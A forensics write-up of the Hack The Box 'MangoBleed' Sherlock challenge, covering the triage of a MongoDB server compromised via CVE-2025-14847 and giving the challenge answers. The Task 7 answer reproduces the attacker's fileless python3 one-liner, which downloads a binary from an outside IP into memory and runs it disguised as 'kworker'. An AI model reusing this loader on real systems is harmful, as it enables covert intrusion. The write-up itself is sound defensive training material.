# 🕵️‍♂️ HTB Sherlock: MangoBleed Write-up

![Category](https://img.shields.io/badge/Category-DFIR-blue?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)

## 📝 Scenario Information
**Sherlock Scenario:**
> You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, `mongodbsync`, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as **MongoBleed**. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

**Objective:**
Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity, and summarize findings.

---

<img width="1427" height="153" alt="image" src="https://github.com/user-attachments/assets/2427bad7-7921-4654-8e9a-814f37d5b036" />

## Download File Untuk Nantinya Menjawab Pertanyaan dan Analisis : 
<img width="1410" height="368" alt="image" src="https://github.com/user-attachments/assets/0282836f-a6c8-4735-ab4f-679b32e35406" />

---
# 🔍 Walkthrough & Analysis

### 1. CVE Identification
**Question:** What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
<img width="1014" height="229" alt="image" src="https://github.com/user-attachments/assets/291a584d-c6f9-454b-b5a5-b82bde7872c2" />

* **Analysis:** Berdasarkan Judulnya MongoBleed CVE yang rentan bisa di search menggunakan Search Engine misal (Google)
<details>
<summary>Click to see answer</summary>

**Answer:** `CVE-2025-14847`
</details>

### 2. Targeted Version
**Question:** What is the version of MongoDB installed on the server that the CVE exploited?
<img width="775" height="61" alt="image" src="https://github.com/user-attachments/assets/4a4dfde3-cd9c-4272-8b8e-a65cd47c929c" />

* **Method:** Check Mongo Log yang ada di `📂uac-mongodbsync-linux-triage/[root]/var/log/mongodb/` setelah di ekstrak, Untuk mendapatkan version bisa menggunakan command berikut : 
    ```bash
    cat mongod.log | grep version
<details>
<summary>Click to see answer</summary>

**Answer:** `8.0.16`
</details>

### Task 3: Attacker IP
**Question:** Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.

* **Method:** Check Mongo Log yang ada di `📂uac-mongodbsync-linux-triage/[root]/var/log/mongodb/` setelah di ekstrak, Untuk mendapatkan version bisa menggunakan command berikut : 


<details>
<summary>Click to see answer</summary>

**Answer:** `65.0.76.43`
</details>

### Task 4: Exploitation Start Time
**Question:** Determine the exact date and time the attacker’s exploitation activity began.
<details>
<summary>Click to see answer</summary>

**Answer:** `2025-12-29 05:25:52`
</details>

### Task 5: Malicious Connections
**Question:** Calculate the total number of malicious connections initiated by the attacker.
<details>
<summary>Click to see answer</summary>

**Answer:** `382`
</details>

### Task 6: Remote Access Time
**Question:** Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
<details>
<summary>Click to see answer</summary>

**Answer:** `2025-12-29 05:40:03`
**Method:** Analyzed `auth.log` for successful SSH logins from the malicious IP.
</details>

### Task 7: Malicious Command
**Question:** Identify the exact command line the attacker used to execute an in‑memory script.
<details>
<summary>Click to see answer</summary>

**Answer:**
```bash
python3 -c 'import os,sys,urllib.request;import ctypes;M=ctypes.CDLL(None);M.syscall.restype=ctypes.c_int;fd=M.syscall(319,b"",1);m=open(fd,"wb");m.write(urllib.request.urlopen("[http://65.0.76.43:8000/lin](http://65.0.76.43:8000/lin)").read());m.close();os.execv(f"/proc/self/fd/{fd}",["kworker"])'
```

</details>

---
## 🛡️ Incident Summary & Mitigation
The attacker exploited **CVE-2025-14847 (MongoBleed)** to leak memory contents, retrieving credentials which allowed for valid SSH access. Post-compromise, they executed a fileless payload and attempted to exfiltrate the database directory.

**Recommendations:**
1.  **Patch Management:** Update MongoDB to the latest stable version immediately.
2.  **Network Security:** Restrict port 27017 access to trusted internal IPs only.
3.  **Credential Rotation:** Reset all SSH and Database user passwords.

---
*Created for educational purposes.*
